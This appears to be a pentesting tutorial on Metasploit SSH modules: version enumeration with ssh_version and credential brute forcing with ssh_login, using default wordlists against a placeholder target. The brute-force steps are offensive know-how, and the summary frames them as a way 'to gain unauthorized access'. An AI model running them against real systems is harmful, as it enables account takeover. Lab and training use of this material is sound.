# Enumerating SSH

**Enumerating SSH and Accessing Using Metasploit**

#### What is SSH?

* **SSH (Secure Shell):** A protocol used to securely access and manage systems over a network.
* **Purpose:**
  * Provides encrypted communication.
  * Enables remote login and command execution.

#### What is Auxiliary in Metasploit?

* **Auxiliary Modules:**
  * Tools in Metasploit that perform specific tasks like scanning, enumeration, and exploitation.
  * Do not necessarily exploit vulnerabilities but aid in information gathering and testing.

#### Enumerating SSH to Get Version Number

1.  Open Metasploit:

    ```bash
    msfconsole
    ```
2.  Search for SSH-related auxiliary modules:

    ```bash
    search type:auxiliary name:ssh
    ```
3.  Select the SSH version scanner module:

    ```bash
    use auxiliary/scanner/ssh/ssh_version
    ```
4.  View detailed information about the module:

    ```bash
    info
    ```
5.  Set the target's IP address:

    ```bash
    set RHOSTS TARGET_IP
    ```

    * Replace `TARGET_IP` with the target machine's IP address.
6.  Configure additional settings if necessary, then check the current settings:

    ```bash
    show options
    ```
7.  Run the module to enumerate the SSH version:

    ```bash
    run
    ```

#### Accessing SSH Using Brute Force

1.  Search for the brute force module in Metasploit:

    ```bash
    search type:auxiliary name:ssh
    ```
2.  Choose the SSH brute force module:

    ```bash
    use auxiliary/scanner/ssh/ssh_login
    ```
3.  View available options:

    ```bash
    show options
    ```
4. Configure the module:
   *   Set the user list file:

       ```bash
       set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
       ```
   *   Set the password list file:

       ```bash
       set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
       ```
   *   Set the target IP address:

       ```bash
       set RHOSTS TARGET_IP
       ```
5.  Execute the brute force attack:

    ```bash
    run
    ```

#### Summary

* **SSH Enumeration:** Use the `ssh_version` module to identify the SSH version running on the target system.
* **SSH Brute Forcing:** The `ssh_login` module helps test common username and password combinations to gain unauthorized access.
* **Metasploit Auxiliary Modules:** Facilitate scanning and testing without directly exploiting vulnerabilities.

